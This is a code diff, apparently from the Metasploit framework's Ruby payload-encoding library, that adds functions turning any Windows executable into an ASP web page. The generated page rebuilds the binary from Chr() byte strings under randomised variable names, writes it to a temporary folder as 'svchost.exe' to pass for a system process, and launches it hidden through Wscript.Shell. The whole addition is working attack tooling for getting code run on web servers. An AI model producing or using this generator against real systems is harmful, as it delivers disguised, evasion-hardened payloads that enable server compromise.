@@ -506,8 +506,67 @@ require 'metasm'
 		vbs
 	end
 
+	def self.to_exe_asp(exes = '', opts={})
+		exe = exes.unpack('C*')
+		vbs = "<%\r\n"
+
+		var_bytes   =  Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+		var_fname   =  Rex::Text.rand_text_alpha(rand(8)+8)
+		var_func    =  Rex::Text.rand_text_alpha(rand(8)+8)
+		var_stream  =  Rex::Text.rand_text_alpha(rand(8)+8)
+		var_obj     =  Rex::Text.rand_text_alpha(rand(8)+8)
+		var_shell   =  Rex::Text.rand_text_alpha(rand(8)+8)
+		var_tempdir =  Rex::Text.rand_text_alpha(rand(8)+8)
+		var_tempexe =  Rex::Text.rand_text_alpha(rand(8)+8)
+		var_basedir =  Rex::Text.rand_text_alpha(rand(8)+8)
+
+		vbs << "Sub #{var_func}()\r\n"
+
+		vbs << "#{var_bytes}=Chr(#{exe[0]})"
+
+		lines = []
+		1.upto(exe.length-1) do |byte|
+			if(byte % 100 == 0)
+				lines.push "\r\n#{var_bytes}=#{var_bytes}"
+			end
+			# exe is an Array of bytes, not a String, thanks to the unpack
+			# above, so the following line is not subject to the different
+			# treatments of String#[] between ruby 1.8 and 1.9
+			lines.push "&Chr(#{exe[byte]})"
+		end
+		vbs << lines.join("") + "\r\n"
+
+		vbs << "Dim #{var_obj}\r\n"
+		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
+		vbs << "Dim #{var_stream}\r\n"
+		vbs << "Dim #{var_tempdir}\r\n"
+		vbs << "Dim #{var_tempexe}\r\n"
+		vbs << "Dim #{var_basedir}\r\n"
+		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
+
+		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
+		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
+		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
+		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
+		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
+		vbs << "#{var_stream}.Close\r\n"
+		vbs << "Dim #{var_shell}\r\n"
+		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
+
+		vbs << "#{var_shell}.run #{var_tempexe}, 0, false\r\n"
+		vbs << "End Sub\r\n"
+
+		vbs << "#{var_func}\r\n"
+		vbs << "%>\r\n"
+		vbs
+	end
+
 	def self.to_win32pe_vbs(framework, code, opts={})
 		to_exe_vbs(to_win32pe(framework, code, opts), opts)
+	end
+
+	def self.to_win32pe_asp(framework, code, opts={})
+		to_exe_asp(to_win32pe(framework, code, opts), opts)
 	end
 
 	# Creates a .NET DLL which loads data into memory
